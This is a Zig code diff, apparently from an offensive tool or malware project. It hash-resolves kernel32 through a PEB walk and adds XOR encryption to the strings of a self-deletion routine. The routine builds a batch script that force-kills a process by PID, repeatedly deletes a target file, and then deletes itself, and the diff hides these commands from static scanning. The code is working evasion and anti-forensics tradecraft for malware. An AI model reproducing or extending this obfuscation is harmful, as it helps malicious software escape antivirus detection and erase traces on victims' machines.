@@ -5,6 +5,16 @@ const hash = @import("../types/hash.zig");
 const peb_walk = @import("../types/peb_walk.zig");
 const export_resolve = @import("../types/export_resolve.zig");
 
+const E = struct {
+    pub const B_PRE = hash.xorEncrypt("@echo off\r\n:loop\r\ndel /F /Q \"");
+    pub const B_DEL_END = hash.xorEncrypt("\" >nul 2>&1\r\n");
+    pub const B_TASKKILL = hash.xorEncrypt("taskkill /F /PID ");
+    pub const B_TASKKILL_END = hash.xorEncrypt(" >nul 2>&1\r\n");
+    pub const B_TIMEOUT = hash.xorEncrypt("timeout /t 2 /nobreak >nul 2>&1\r\n");
+    pub const B_IF_EXIST = hash.xorEncrypt("if exist \"");
+    pub const B_END = hash.xorEncrypt("\" goto loop\r\ndel /F /Q \"%~f0\" >nul 2>&1\r\nexit\r\n");
+};
+
 fn loadKernel32() ?types.PVOID {
     return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
 }
@@ -105,40 +115,54 @@ fn deleteLevel3(path: []const u8) bool {
     var batch_buf: [4096]u8 = undefined;
     var pos: usize = 0;
 
-    const b_pre = "@echo off\r\n:loop\r\ndel /F /Q \"";
+    var b_pre_buf: [E.B_PRE.len]u8 = undefined;
+    hash.xorDecrypt(&E.B_PRE, &b_pre_buf);
+    const b_pre = b_pre_buf[0..];
     @memcpy(batch_buf[pos..][0..b_pre.len], b_pre);
     pos += b_pre.len;
 
     @memcpy(batch_buf[pos..][0..path.len], path);
     pos += path.len;
 
-    const b_del_end = "\" >nul 2>&1\r\n";
+    var b_del_end_buf: [E.B_DEL_END.len]u8 = undefined;
+    hash.xorDecrypt(&E.B_DEL_END, &b_del_end_buf);
+    const b_del_end = b_del_end_buf[0..];
     @memcpy(batch_buf[pos..][0..b_del_end.len], b_del_end);
     pos += b_del_end.len;
 
-    const b_taskkill = "taskkill /F /PID ";
+    var b_taskkill_buf: [E.B_TASKKILL.len]u8 = undefined;
+    hash.xorDecrypt(&E.B_TASKKILL, &b_taskkill_buf);
+    const b_taskkill = b_taskkill_buf[0..];
     @memcpy(batch_buf[pos..][0..b_taskkill.len], b_taskkill);
     pos += b_taskkill.len;
 
     const pid_str = std.fmt.formatIntBuf(batch_buf[pos..], pid, 10, .lower, .{});
     pos += pid_str;
 
-    const b_taskkill_end = " >nul 2>&1\r\n";
+    var b_taskkill_end_buf: [E.B_TASKKILL_END.len]u8 = undefined;
+    hash.xorDecrypt(&E.B_TASKKILL_END, &b_taskkill_end_buf);
+    const b_taskkill_end = b_taskkill_end_buf[0..];
     @memcpy(batch_buf[pos..][0..b_taskkill_end.len], b_taskkill_end);
     pos += b_taskkill_end.len;
 
-    const b_timeout = "timeout /t 2 /nobreak >nul 2>&1\r\n";
+    var b_timeout_buf: [E.B_TIMEOUT.len]u8 = undefined;
+    hash.xorDecrypt(&E.B_TIMEOUT, &b_timeout_buf);
+    const b_timeout = b_timeout_buf[0..];
     @memcpy(batch_buf[pos..][0..b_timeout.len], b_timeout);
     pos += b_timeout.len;
 
-    const b_if_exist = "if exist \"";
+    var b_if_exist_buf: [E.B_IF_EXIST.len]u8 = undefined;
+    hash.xorDecrypt(&E.B_IF_EXIST, &b_if_exist_buf);
+    const b_if_exist = b_if_exist_buf[0..];
     @memcpy(batch_buf[pos..][0..b_if_exist.len], b_if_exist);
     pos += b_if_exist.len;
 
     @memcpy(batch_buf[pos..][0..path.len], path);
     pos += path.len;
 
-    const b_end = "\" goto loop\r\ndel /F /Q \"%~f0\" >nul 2>&1\r\nexit\r\n";
+    var b_end_buf: [E.B_END.len]u8 = undefined;
+    hash.xorDecrypt(&E.B_END, &b_end_buf);
+    const b_end = b_end_buf[0..];
     @memcpy(batch_buf[pos..][0..b_end.len], b_end);
     pos += b_end.len;
 
